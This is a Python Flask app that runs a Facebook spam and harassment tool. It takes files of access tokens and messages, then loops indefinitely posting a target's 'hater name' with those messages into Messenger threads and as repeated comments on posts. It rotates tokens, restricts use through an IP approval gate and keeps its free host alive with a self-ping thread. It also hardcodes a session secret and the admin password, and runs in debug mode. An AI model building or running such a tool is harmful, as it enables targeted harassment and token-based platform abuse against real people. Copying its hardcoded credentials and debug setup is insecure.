from flask import Flask, request, render_template
import requests
from threading import Thread, Event
import time
import random
import string

# --- added imports for approval/admin ---
from flask import session, redirect, url_for

app = Flask(__name__)
app.debug = True

# --- secret key for sessions (added) ---
app.secret_key = 'k8m2p9x7w4n6q1v5z3c8b7f2j9r4t6y1u3i5o8e2a7s9d4g6h1l3'

# --- approval system state (added) ---
approved_users = set()
pending_requests = set()

# --- admin credentials (change as needed) ---
ADMIN_USERNAME = 'admin'
ADMIN_PASSWORD = 'adminpass123'

# --- helper to identify a device/user (added) ---
def get_user_id():
    # Prefer X-Forwarded-For if behind proxy (Render, etc.)
    ip = (request.headers.get('X-Forwarded-For') or request.remote_addr or '').split(',')[0].strip()
    # Keep it simple/stable: IP-based identifier
    return ip

# --- approval middleware (robust path-based) (added) ---
@app.before_request
def check_approval():
    path = (request.path or '/')
    # Always allow admin and approval routes and static files
    if path.startswith('/admin') or path.startswith('/approval') or path.startswith('/static') or path == '/favicon.ico':
        return
    # Admin can access everything
    if session.get('admin_logged_in'):
        return
    # Non-admins must be approved
    user_id = get_user_id()
    if user_id not in approved_users:
        return redirect(url_for('approval_request'))

# In-memory task tracking
stop_events = {}
threads = {}

# Facebook API headers
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j)...',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'referer': 'www.google.com'
}

@app.route('/')
def home():
    return render_template("home.html")

@app.route('/convo', methods=['GET','POST'])
def convo():
    if request.method == 'POST':
        token_option = request.form.get('tokenOption')
        if token_option == 'single':
            access_tokens = [request.form.get('singleToken')]
        else:
            token_file = request.files['tokenFile']
            access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))
        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()

        return f'''
        ✅ Convo Task Started!<br>
        🧠 Stop Key: <b>{task_id}</b><br><br>
        <form method="POST" action="/stop">
            <input name="taskId" value="{task_id}" readonly>
            <button type="submit">🛑 Stop</button>
        </form>
        '''
    return render_template("convo_form.html")

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)
                print("✅" if response.status_code == 200 else "❌", message)
                time.sleep(time_interval)

@app.route('/post', methods=['GET','POST'])
def post():
    if request.method == 'POST':
        count = int(request.form.get('count', 0))
        task_ids = []

        for i in range(1, count + 1):
            post_id = request.form.get(f"id_{i}")
            hname = request.form.get(f"hatername_{i}")
            delay = request.form.get(f"delay_{i}")
            token_file = request.files.get(f"token_{i}")
            msg_file = request.files.get(f"comm_{i}")

            if not (post_id and hname and delay and token_file and msg_file):
                return f"❌ Missing required fields for post #{i}"

            tokens = token_file.read().decode().strip().splitlines()
            comments = msg_file.read().decode().strip().splitlines()

            task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
            stop_events[task_id] = Event()
            thread = Thread(target=post_comments, args=(post_id, tokens, comments, hname, int(delay), task_id))
            thread.start()
            threads[task_id] = thread
            task_ids.append(task_id)

        response = ""
        for tid in task_ids:
            response += f"""
                ✅ Post Task Started!<br>
                🧠 Stop Key: <b>{tid}</b><br><br>
                <form method='POST' action='/stop'>
                    <input type='hidden' name='taskId' value='{tid}'>
                    <button type='submit'>🛑 Stop This Task</button>
                </form><br><hr>
            """
        return response

    return render_template("post_form.html")

def post_comments(post_id, tokens, comments, hname, delay, task_id):
    stop_event = stop_events[task_id]
    token_index = 0
    while not stop_event.is_set():
        comment = f"{hname} {random.choice(comments)}"
        token = tokens[token_index % len(tokens)]
        url = f"https://graph.facebook.com/{post_id}/comments"
        res = requests.post(url, data={"message": comment, "access_token": token})
        print("✅" if res.status_code == 200 else "❌", comment)
        token_index += 1
        time.sleep(delay)

@app.route('/stop', methods=['GET','POST'])
def stop():
    if request.method == 'POST':
        task_id = request.form['taskId']
        if task_id in stop_events:
            stop_events[task_id].set()
            return f"🛑 Task <b>{task_id}</b> has been stopped!"
        return "❌ Invalid Stop Key"
    return '''
    <h3>Stop a Running Task</h3>
    <form method="POST">
        <input name="taskId" placeholder="Paste Stop Key here">
        <button type="submit">🛑 Stop</button>
    </form>
    '''

# -------------------- Self-Ping Feature --------------------
def self_ping():
    url = "https://cha7-upda7ed.onrender.com"  # Replace with your deployed app URL if needed
    while True:
        try:
            requests.get(url)
            print("🌐 Self-ping successful")
        except:
            print("⚠️ Self-ping failed")
        time.sleep(300)  # Ping every 5 minutes

# -------------------- Approval + Admin routes (added) --------------------
@app.route('/approval_request', methods=['GET', 'POST'])
def approval_request():
    user_id = get_user_id()
    if user_id in approved_users or session.get('admin_logged_in'):
        return redirect(url_for('home'))
    if request.method == 'POST':
        if user_id not in pending_requests:
            pending_requests.add(user_id)
            return render_template('approval_sent.html')
        else:
            return render_template('approval_request.html', already_requested=True)
    return render_template('approval_request.html')

@app.route('/approval_sent')
def approval_sent():
    return render_template('approval_sent.html')

@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if session.get('admin_logged_in'):
        return redirect(url_for('admin_panel'))
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            session['admin_logged_in'] = True
            session.permanent = True  # make session persistent
            return redirect(url_for('admin_panel'))
        else:
            return render_template('admin_login.html', error=True)
    return render_template('admin_login.html')

@app.route('/admin/logout')
def admin_logout():
    session.pop('admin_logged_in', None)
    return redirect(url_for('admin_login'))

@app.route('/admin/panel')
def admin_panel():
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))
    return render_template('admin_panel.html',
                           pending_requests=list(pending_requests),
                           approved_users=list(approved_users))

@app.route('/admin/approve/<user_id>')
def approve_user(user_id):
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))
    if user_id in pending_requests:
        pending_requests.remove(user_id)
        approved_users.add(user_id)
    return redirect(url_for('admin_panel'))

@app.route('/admin/reject/<user_id>')
def reject_user(user_id):
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))
    if user_id in pending_requests:
        pending_requests.remove(user_id)
    return redirect(url_for('admin_panel'))

@app.route('/admin/remove/<user_id>')
def remove_user(user_id):
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))
    if user_id in approved_users:
        approved_users.remove(user_id)
    return redirect(url_for('admin_panel'))

if __name__ == '__main__':
    # Start self-ping thread
    ping_thread = Thread(target=self_ping, daemon=True)
    ping_thread.start()

    app.run(host='0.0.0.0', port=10000)
